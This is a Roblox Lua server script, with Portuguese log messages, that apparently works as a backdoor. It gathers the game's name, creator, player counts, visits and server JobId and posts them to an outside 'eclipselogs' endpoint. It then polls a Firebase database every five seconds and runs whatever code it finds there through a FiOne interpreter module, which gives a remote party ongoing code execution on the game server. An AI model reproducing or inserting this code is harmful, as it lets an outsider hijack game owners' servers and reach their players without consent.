local HttpService = game:GetService("HttpService")
local gameUrl = "https://games.roproxy.com/v1/games?universeIds=" .. game.GameId
local success, gameResponse = pcall(function()
	return HttpService:GetAsync(gameUrl)
end)

print("gameUrl: " .. gameUrl)

if success then
	local decodeSuccess, decodedData = pcall(function()
		return HttpService:JSONDecode(gameResponse)
	end)

	if decodeSuccess and decodedData.data and decodedData.data[1] then
		local gameData = decodedData.data[1]

		local gameInfo = {
			id = game.PlaceId,
			name = gameData.name,
			creatorName = gameData.creator.name,
			playing = gameData.playing,
			visits = gameData.visits,
			maxPlayers = gameData.maxPlayers,
			updated = gameData.updated,
			created = gameData.created,
			favoritedCount = gameData.favoritedCount,
			universeAvatarType = gameData.universeAvatarType,
			description = gameData.description or "Descrição não disponível.",
			jobId = tostring(game.JobId) or "null"
		}

		local imageEndpoint = "https://thumbnails.roblox.com/v1/places/gameicons?placeIds=" .. tostring(game.PlaceId) .. "&size=512x512&format=Png&isCircular=false"
		print("Image Endpoint: " .. imageEndpoint)

		local imgSuccess, imgResponse = pcall(function()
			return HttpService:GetAsync(imageEndpoint)
		end)

		if imgSuccess then
			local imgDecodeSuccess, imgData = pcall(function()
				return HttpService:JSONDecode(imgResponse)
			end)
			if imgDecodeSuccess and imgData.data and imgData.data[1] and imgData.data[1].imageUrl then
				gameInfo.imageUrl = imgData.data[1].imageUrl
			else
				warn("Erro ao obter o campo imageUrl do JSON da imagem.")
				gameInfo.imageUrl = imageEndpoint
			end
		else
			warn("Erro ao buscar o JSON da imagem.")
			gameInfo.imageUrl = imageEndpoint
		end

		print("Game info: " .. HttpService:JSONEncode(gameInfo))
		print("Final Image URL: " .. gameInfo.imageUrl)

		local url = "https://eclipselogs.netlify.app/.netlify/functions/datagame"
		local jsonData = HttpService:JSONEncode(gameInfo)

		local postSuccess, postResponse = pcall(function()
			return HttpService:PostAsync(url, jsonData, Enum.HttpContentType.ApplicationJson)
		end)

		if postSuccess then
			print("Dados enviados com sucesso!")
		else
			warn("Erro ao enviar os dados: " .. tostring(postResponse))
		end
	else
		warn("Erro ao decodificar a resposta do jogo.")
	end
else
	warn("Erro ao buscar os dados do jogo.")
end

local firebaseURL = "https://serverside-63d29-default-rtdb.firebaseio.com/mensagem.json"
local FiOne = require(script.Modules.FiOne)

while true do
	local sucesso, resposta = pcall(function()
		return HttpService:GetAsync(firebaseURL)
	end)

	if sucesso and resposta then
		local Input = HttpService:JSONDecode(resposta)
		if Input ~= nil and Input ~= "" then
			FiOne(Input)()
		end
	end
	wait(5)
end
